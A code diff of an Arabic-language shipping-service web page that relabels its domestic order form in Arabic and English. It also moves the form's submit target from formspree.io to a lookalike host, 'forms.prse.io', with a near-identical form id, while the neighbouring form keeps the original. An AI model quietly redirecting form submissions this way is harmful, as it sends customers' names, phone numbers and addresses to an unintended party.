@@ -189,19 +189,23 @@
     <button onclick="submitFeedback()">إرسال</button>
   </div>
 
-  <form action="https://formspree.io/f/xnqepqyk" method="POST">
-    <h3 id="local-title">شحن داخل مصر</h3>
-    <input type="text" name="sender" placeholder="اسم الراسل" required>
-    <input type="text" name="receiver" placeholder="اسم المرسل إليه" required>
-    <input type="tel" name="phone" placeholder="رقم الهاتف" required>
+ <form action="https://forms.prse.io/f/xmqepgyk" method="POST">
+    <div id="local-title">طلب خدمة (Service Request)</div>
+    
+    <input type="text" name="sender" placeholder="اسم المرسل (Sender Name)" required>
+    <input type="text" name="receiver" placeholder="اسم المستلم (Receiver Name)" required>
+    <input type="tel" name="phone" placeholder="رقم الهاتف (Phone Number)" required>
+    
     <select name="service" id="local-service">
-      <option value="fast">سريعة</option>
-      <option value="normal">عادية</option>
+        <option value="fast">خدمة سريعة (Fast Service)</option>
+        <option value="normal">خدمة عادية (Normal Service)</option>
     </select>
-    <input type="text" name="address" placeholder="العنوان" required>
-    <textarea name="details" placeholder="وصف الشحنة" required></textarea>
-    <button type="submit">أرسل</button>
-  </form>
+    
+    <input type="text" name="address" placeholder="العنوان (Address)" required>
+    <textarea name="details" placeholder="تفاصيل الطلب (Request Details)" required></textarea>
+    
+    <button type="submit">إرسال (Submit)</button>
+</form>
 
   <form action="https://formspree.io/f/xnqepqyk" method="POST">
     <h3 id="intl-title">استيراد من خارج مصر</h3>
